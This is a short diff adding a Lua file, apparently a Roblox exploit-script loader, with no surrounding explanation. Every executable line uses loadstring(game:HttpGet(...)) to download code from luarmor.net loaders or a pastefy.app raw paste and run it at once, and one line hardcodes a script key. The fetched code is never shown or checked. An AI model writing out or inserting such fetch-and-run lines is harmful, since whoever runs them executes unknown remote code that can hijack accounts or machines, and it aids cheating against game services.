@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c62563366e7ba3208d704a4e2d7e6789.lua"))()
+
+script_key="gdxwIzouyMzICcYJYGeaTvtdUzqjhIPv";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5896f91b3735956f3d9d0727b84fcbe5.lua"))()
+
+loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
